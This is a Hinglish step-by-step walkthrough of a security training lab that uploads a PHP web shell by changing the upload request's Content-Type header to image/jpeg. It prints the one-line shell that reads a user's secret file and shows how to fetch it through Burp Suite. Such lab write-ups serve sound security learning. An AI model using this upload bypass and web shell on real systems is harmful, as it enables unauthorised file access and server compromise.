## ✅ Lab: Web shell upload via Content-Type restriction bypass

### 🔐 Goal:

Upload a PHP web shell despite file type restrictions and extract the contents of `/home/carlos/secret`.

---

### 🪜 Step-by-Step Solution

#### 📁 1. PHP Web Shell File Create Karo

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

* File ka naam rakho: `exploit.php`
* Save karlo system pe.

---

#### 🔐 2. Login to Lab Website

* Visit lab site.
* Login using:

  ```
  Username: wiener
  Password: peter
  ```

---

#### 🖼️ 3. Image Upload Feature Test Karo

* Account page pe jao.
* Koi **valid `.jpg` image** upload karo as avatar.
* Burp Suite ka **intercept on** karo aur dekho `POST /my-account/avatar` request kaisi hoti hai.

---

#### 🎯 4. Exploit File Upload Attempt Karo

* `exploit.php` file select karo.
* Intercept on karo Burp mein.
* Jab file upload request aaye (POST request), usko **Burp Repeater** mein bhejo.

---

#### 🛠️ 5. Content-Type Bypass Karo

* POST request ke `Content-Type` header mein default hoga:

  ```
  Content-Type: application/x-php
  ```
* Usko change karo:

  ```
  Content-Type: image/jpeg
  ```
* File ka naam `exploit.php` hi rehne do.
* Request send karo.

---

#### ✅ 6. File Upload Confirmation Check Karo

* Response mein yeh message milega:

  ```
  The file avatars/exploit.php has been uploaded.
  ```

---

#### 🔎 7. Web Shell Access Karo

* `GET /files/avatars/exploit.php` request send karo using Burp Repeater.
* Response mein Carlos ka secret mil jaayega, for example:

  ```
  q1w2e3r4t5y6u7i8o9p0
  ```

---

#### 🧠 8. Secret Submit Karo

* Lab banner pe jaake secret paste karo.
* Submit dabao.
* ✅ **Lab solved successfully!**

---

### 📌 Note:

Is lab mein server sirf `Content-Type` header validate karta hai — isiliye humne header manipulate karke bypass kiya. **Yeh ek real-world misconfiguration** hai jahan developers sirf MIME type headers pe rely karte hain.

---

### 🧪 Tools Used:

* Burp Suite (Community Edition)
* PHP shell file
* Firefox/Chrome
